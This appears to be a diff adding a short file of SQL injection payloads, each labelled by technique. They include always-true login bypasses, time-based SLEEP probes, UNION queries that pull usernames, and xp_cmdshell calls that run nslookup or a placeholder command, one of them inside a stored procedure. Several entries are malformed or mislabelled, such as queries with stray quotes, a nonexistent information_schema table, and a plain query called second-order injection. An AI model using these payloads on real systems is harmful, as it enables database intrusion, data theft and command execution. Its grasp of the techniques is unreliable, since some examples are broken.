@@ -1,0 +1,24 @@
+SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'password'; (Classic SQL Injection)
+
+SELECT * FROM users WHERE username = 'admin' AND 1=1' --(Blind SQL Injection)
+
+SELECT * FROM users WHERE username = 'admin' AND IF(1=1, SLEEP(5), 0)' OR IF(1=1, SLEEP(5), 0) -- (Blind SQL Injection)
+
+1' AND 1=CONVERT(int, (SELECT @@version)) -- (Error-Based SQL Injection)
+
+SELECT name, age FROM users WHERE id = 1 UNION SELECT null, username FROM information_schema.users --;(Union-Based SQL Injection)
+
+' OR 1=1; EXEC xp_cmdshell('nslookup example.com') -- (Out-of-Band SQL Injection)
+
+SELECT * FROM comments WHERE text = 'malicious input'; (Second-Order SQL Injection)
+
+
+(Stored SQL Injection)
+CREATE PROCEDURE malicious_procedure AS
+BEGIN
+  EXEC xp_cmdshell('malicious command');
+END; 
+
+
+1 UNION SELECT 1, username, 1 FROM users -- (Blind Union-Based SQL Injection)
+
